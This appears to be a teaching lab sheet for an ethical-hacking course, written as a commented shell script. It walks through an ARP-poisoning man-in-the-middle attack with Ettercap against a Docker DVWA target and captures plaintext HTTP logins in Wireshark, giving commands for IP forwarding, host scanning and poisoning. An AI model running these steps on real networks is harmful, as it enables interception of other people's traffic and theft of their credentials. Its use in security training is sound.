# EHPT Lab 4 – MITM using Ettercap (GUI-based) + ARP Poisoning
# Uses: Docker-DVWA, Wireshark, Ettercap GUI
# Run as root on Kali Linux

# STEP 1: Install Ettercap and Wireshark
sudo apt install ettercap-graphical wireshark -y

# STEP 2: Enable IP forwarding (CRITICAL – do this first)
cat /proc/sys/net/ipv4/ip_forward           # Check current value (should be 0)
echo 1 > /proc/sys/net/ipv4/ip_forward      # Enable forwarding
cat /proc/sys/net/ipv4/ip_forward           # Verify it's now 1

# STEP 3: Find your network info
ip addr show          # Find your IP and interface (e.g., eth0)
ip route              # Find gateway IP
arp -n                # See ARP table

# STEP 4: Start Docker DVWA (target machine)
sudo docker run --rm -it -p 8080:80 vulnerables/web-dvwa 2>/dev/null || \
sudo docker run -d -p 8080:80 sagikazarmark/dvwa
# Access DVWA at: http://localhost:8080

# STEP 5: Launch Ettercap GUI
sudo ettercap -G &
# In Ettercap GUI:
# 1. Sniff → Unified Sniffing → Select interface (eth0 or wlan0)
# 2. Hosts → Scan for Hosts
# 3. Hosts → Host List
# 4. Select Target1 (victim IP) → Add to Target 1
# 5. Select Target2 (gateway IP) → Add to Target 2
# 6. MITM → ARP Poisoning → Check "Sniff remote connections" → OK
# 7. Start → Start Sniffing

# STEP 6: CLI equivalent of Ettercap MITM (same result)
# Replace IPs with your actual victim and gateway IPs
# Victim IP example: 10.248.18.106
# Gateway IP example: 10.248.18.1
sudo ettercap -T -q -M arp:remote /10.248.18.106// /10.248.18.1//

# STEP 7: Capture traffic with Wireshark simultaneously
sudo wireshark &
# In Wireshark: select same interface → Start capture
# Filter: http to see login credentials

# STEP 8: Verify ARP poisoning is working
arp -n
# Victim's entry should now show your MAC address

# STEP 9: Stop attack
# In Ettercap GUI: Start → Stop Sniffing
# Then: MITM → Stop MITM attacks
# Disable IP forwarding when done
echo 0 > /proc/sys/net/ipv4/ip_forward

# Conclusion:
# ARP poisoning MITM attack was performed using Ettercap GUI.
# Network traffic between victim and gateway was intercepted.
# HTTP credentials submitted to DVWA were visible in plain text in Wireshark.
# This demonstrates the danger of unencrypted HTTP communication on LANs.
